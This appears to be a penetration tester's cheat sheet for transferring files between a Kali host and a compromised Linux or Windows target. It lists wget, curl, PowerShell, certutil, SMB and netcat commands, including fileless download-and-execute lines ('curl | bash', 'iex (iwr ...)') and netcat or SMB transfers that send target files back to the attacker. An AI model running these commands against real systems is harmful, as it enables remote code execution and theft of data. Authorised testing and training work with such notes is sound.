# File transfer

## From Kali, with pwn-broker
At the prompt, to offer the target's upload/ folder and the tools' files:
serve
serve files
- [ ] A file of my own goes in the target's upload/ folder first
- [ ] serve files prints the line to paste on the target for each file, and the line to send one back into loot/
- [ ] serve log shows who fetched what

## Linux target, by hand
On Kali, in the folder to offer:
python3 -m http.server 8000
On the target:
wget http://<LHOST>:8000/<File> -O /dev/shm/<File>
curl -o /dev/shm/<File> http://<LHOST>:8000/<File>
A script, run without writing it to disk:
curl -s http://<LHOST>:8000/<File> | bash
No wget and no curl:
python3 -c "import urllib.request as u;u.urlretrieve('http://<LHOST>:8000/<File>','/dev/shm/<File>')"
With an SSH login:
scp <File> '<Username>'@<TargetIP>:/dev/shm/

## Windows target, by hand
iwr -UseBasicParsing -Uri http://<LHOST>:8000/<File> -OutFile C:\Windows\Temp\<File>
(New-Object Net.WebClient).DownloadFile('http://<LHOST>:8000/<File>','C:\Windows\Temp\<File>')
From cmd.exe:
curl http://<LHOST>:8000/<File> -o C:\Windows\Temp\<File>
certutil -urlcache -split -f http://<LHOST>:8000/<File> C:\Windows\Temp\<File>
- [ ] certutil is flagged by Defender on sight: last resort
A PowerShell script, straight into memory:
iex (iwr -UseBasicParsing http://<LHOST>:8000/<File>)

## An SMB share from Kali
At the pwn-broker prompt: tool install impacket.
sudo /opt/pwn-broker/bin/impacket-smbserver share "$(pwd)" -smb2support -username kali -password kali
- [ ] The full path with sudo: a bare sudo impacket-smbserver does not use pwn-broker's bin folder
On the target:
net use \\<LHOST>\share /user:kali kali
copy \\<LHOST>\share\<File> C:\Windows\Temp\
- [ ] Newer Windows refuses a share without a login, which is why it has one

## Back to Kali
From Windows, over that share:
copy <File> \\<LHOST>\share\
From Linux, with netcat: the listener on Kali first, then the sender.
nc -lvnp <LPORT> > <File>
nc -q 1 <LHOST> <LPORT> < <File>
Small files, as text:
base64 -w 0 <File>
echo 'THE-BASE64' | base64 -d > <File>

## Check it arrived whole
md5sum <File>
certutil -hashfile <File> MD5
Get-FileHash <File> -Algorithm MD5
